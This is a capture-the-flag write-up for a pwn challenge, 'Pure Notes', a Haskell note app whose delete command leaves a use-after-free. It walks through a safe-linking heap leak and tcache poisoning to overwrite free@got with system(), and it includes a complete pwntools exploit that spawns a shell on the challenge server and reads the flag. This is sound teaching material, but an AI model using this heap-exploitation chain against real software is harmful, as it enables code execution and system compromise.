# Pure Notes

- Category: pwn
- Difficulty: Medium-Hard
- Author: Vincent

"My boss said our current note taking solution isn't productive and functional. So I made this purely functional note taking app." A Haskell REPL for notes, backed by raw `malloc`/`free` via the FFI.

The "functional purity" framing is the joke — once notes are backed by `Foreign.Marshal.Alloc.mallocBytes`/`free` (thin FFI wrappers around glibc's *real* `malloc`/`free`), this Haskell program has an entirely ordinary glibc heap underneath it. This is a vanilla glibc **tcache poisoning** exploit wearing a Haskell costume, and the flag puns on exactly that.

### Solution:

##### 1. Recon

```
$ checksec Main
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No Canary Found   NX enabled    PIE Disabled
```

`libc.so.6` itself is PIE + Full RELRO, but that's irrelevant — we never write into libc's own GOT, only need its load base. Two facts matter enormously: **non-PIE** means `Main`'s GOT sits at a fixed, compile-time-known address, no leak needed to find it; **Partial RELRO** means `.got.plt` stays writable for the process lifetime, which is exactly what makes a GOT-overwrite viable.

##### 2. Find the bug

```haskell
delete :: Command
delete args notes = do
  name <- hoistMaybe $ args !? 0
  (b, _) <- hoistMaybe $ lookup name notes
  lift $ free b
  lift $ putStrLn $ "Deleted note " ++ name
  return notes          -- <-- BUG: entry never removed from the list
```

`delete` frees the note's buffer but returns `notes` **unmodified**. Every other command does `lookup name notes` and will happily find this now-dangling entry again — a textbook use-after-free, with both a read (`view` → `peekCAStringLen`) and a write (`write`/`writehex` → `pokeArray`) primitive on freed memory, both operating on exactly the length recorded at `new` time regardless of what the freed chunk actually holds now.

##### 3. A wire-format gotcha

`peekCAStringLen` maps each raw byte 0–255 to a `Char` of the same codepoint; `putStrLn` then re-encodes that through the UTF-8 `Handle` the program configures at startup. Net effect: any freed-memory byte ≥ `0x80` comes back over the wire as a 2-byte UTF-8 sequence, not the raw byte — fully reversible:

```python
def decode_view(raw_wire_bytes: bytes) -> bytes:
    s = raw_wire_bytes.decode('utf-8')
    return bytes(ord(c) for c in s)
```

Only affects reads. On the write side, `write` splits input on whitespace (`words input`), so any payload containing a space/newline byte gets mangled — `writehex` (hex-decodes first) is the intended raw-byte primitive and sidesteps both issues.

##### 4. Leak a heap address for free, via safe-linking

glibc 2.41's tcache safe-linking mangles a bin's `fd` pointer as `(pos >> 12) ^ ptr`. When a chunk is freed into an **empty** bin, the value being protected is `NULL`, so `stored_fd = (chunk_addr >> 12) ^ 0 = chunk_addr >> 12` — no guessing required:

```
new a 0x18
delete a
view a          -> first 8 bytes = chunk_addr >> 12
```

Validated against `/proc/<pid>/maps` at that exact moment — the shifted-back value landed squarely inside `[heap]`. This single primitive (free a chunk alone, `view` it, take the first 8 bytes) is reused throughout as the heap-address leak.

A more "obvious" unsorted-bin libc leak (free a chunk too large for tcache, read its `fd`/`bk`) turned out unreliable here — GHC's own startup (locale/iconv setup, argv/env handling) generates a lot of uncontrolled `malloc`/`free` traffic before any of our commands run, leaving no clean, walkable unsorted-bin entry to read. Abandoned in favor of a technique that doesn't depend on ambient heap state at all: arbitrary-address read via tcache poisoning, using the same primitive as the write.

##### 5. Tcache poisoning — arbitrary read/write

The classic technique: corrupt a bin-head chunk's `fd` so the *next* allocation of that size returns an attacker-chosen address. Two non-obvious constraints, both enforced by glibc itself:

- **`tcache->counts[idx]` gates every pop independently of the `fd` chain.** A single `delete` only gets you `count = 1`; the corrupted entry needs to sit at the head of a bin with `count == 2` so two pops are legal — the first consumes the real corrupted chunk (revealing the forged `fd` as the new head), the second consumes the forged target itself. Getting `count == 2` while keeping the same chunk's known mask means reusing one address twice: free it alone (clean mask), reallocate it, free a second chunk, then free the first one again.
- **The target must be 16-byte aligned and writable.** Modern glibc validates alignment on every pop (`malloc(): unaligned tcache chunk detected`, SIGABRT if not), and `tcache_get` always writes 8 bytes (`e->key = NULL`) at `target + 8` as part of the pop — even for a "read-only" use, so a read-only target segfaults before you ever get to `view` it.

`free@got` (`0xa730f0`) satisfies everything: 16-byte aligned, sits in writable `.got.plt` under Partial RELRO, and is already resolved to the real libc `free()` by the time we use it (from prior `delete` calls) — so reading it is a free libc leak, and overwriting it later redirects every subsequent `free()` call. One address, two uses, one primitive.

##### 6. The full chain

```
1. tcache_poison(size=0x18, target=free@got)  -> note points at free@got
2. view it  -->  leaked free() address  -->  libc_base, system_addr
3. tcache_poison(size=0x28, target=free@got)  -> fresh size class, clean bin
4. writehex the new note with system_addr     -> free@got now holds system()
5. new "sh"; writehex "sh" "/bin/sh\x00"; delete "sh"
     -> Main.hs calls free(ptr_to_"/bin/sh")
     -> GOT hijacked -> actually calls system(ptr_to_"/bin/sh")
     -> shell on the socat pty
6. cat flag.txt
```

##### 7. Exploit

```python
from pwn import *
import struct, sys, time

FREE_GOT   = 0xa730f0   # 16-byte aligned, writable (Partial RELRO), already resolved
FREE_OFF   = 0xa3280    # offset of `free` in this build's libc.so.6
SYSTEM_OFF = 0x53110    # offset of `system` in this build's libc.so.6

r = remote('pure-notes-829932ea8ad5a25e-global.challs.brunnerne.xyz', 1337, ssl=True)
_ctr = [0]

def cmd(c):
    r.sendline(c)
    return r.recvuntil(b"> ", timeout=10)

def new(name, size):     return cmd(f"new {name} {size}".encode())
def delete(name):        return cmd(f"delete {name}".encode())
def writehex(name, b):   return cmd(f"writehex {name} {b.hex()}".encode())

def decode_view(raw_wire_bytes):
    return bytes(ord(c) for c in raw_wire_bytes.decode('utf-8'))

def read_bytes(name, n=24):
    return decode_view(cmd(f"view {name}".encode()))[:n]

def tcache_poison(size, target_addr, tag):
    _ctr[0] += 1
    A, B, C, D = (f"{tag}{x}{_ctr[0]}" for x in "ABCD")

    new(A, size)
    delete(A)                              # tcache=[A], count=1, alone -> clean mask
    mask_A = struct.unpack('<Q', read_bytes(A, 8))[0]

    new(A, size)                            # pop A back out; count=0, list empty
    new(B, size)
    delete(B)                               # tcache=[B], count=1
    delete(A)                               # tcache=[A,B], count=2, A (same addr) is head

    forged = target_addr ^ mask_A
    writehex(A, struct.pack('<Q', forged))  # corrupt head's fd

    new(C, size)                            # pop A's real chunk -> head becomes target
    new(D, size)                            # pop target -> D now points AT target_addr
    return D

leak_name = tcache_poison(0x18, FREE_GOT, "leak")
free_addr = struct.unpack('<Q', read_bytes(leak_name, 8))[0]
libc_base = free_addr - FREE_OFF
system_addr = libc_base + SYSTEM_OFF

write_name = tcache_poison(0x28, FREE_GOT, "write")   # different size class, clean bin
writehex(write_name, struct.pack('<Q', system_addr))

new("sh", 0x10)
writehex("sh", b"/bin/sh\x00")
r.sendline(b"delete sh")

time.sleep(1)
r.sendline(b"cat flag.txt")
time.sleep(1)
print(r.recvrepeat(3).decode(errors='replace'))
r.interactive()
```

```
[+] leaked free@got = 0x7f0733d14280
[+] libc base = 0x7f0733c71000
[+] system() = 0x7f0733cc4110
[+] free@got overwritten with system()
brunner{not_so_functional_is_it}
```

**Flag:** `brunner{not_so_functional_is_it}`

### Takeaways

- The entire vulnerability is one missing `filter`: `delete` frees the pointer but never removes the entry from the persistent, purely-functional notes list. The type system gives no warning that the `Ptr` inside that tuple is now dangling — immutability doesn't save you from a stale reference to memory you don't own.
- FFI breaks the "purely functional / GC-managed" safety story completely. The moment a Haskell program manages its own `Ptr`s via `Foreign.Marshal.Alloc`, every classic C heap-exploitation technique (UAF, double-free, tcache poisoning) applies unchanged — GHC's garbage collector doesn't extend to memory it doesn't own.
- `peekCAStringLen`/`pokeArray` read/write exactly the length recorded at allocation time, with no bounds re-check against the underlying allocation — this is what turns a UAF into a precise, length-controlled arbitrary read/write instead of a vague info leak.
- glibc's tcache is not "one pop per one push" — `tcache->counts[idx]` independently gates every pop. A poisoning chain that corrupts a chunk's `fd` still needs a genuine matching number of prior frees in that bin, or the "second pop" meant to surface the forged target just falls through to an unrelated chunk instead of erroring.
- Tcache-poison targets must be both 16-byte aligned and writable — glibc validates alignment on every pop and always writes 8 bytes at `target + 8` as part of it, regardless of whether the caller only intends to read.
- A single already-resolved, correctly-aligned, writable GOT slot can serve as both the leak source and the eventual write target — no need for two separate primitives when one slot satisfies every constraint and is also the one worth hijacking.
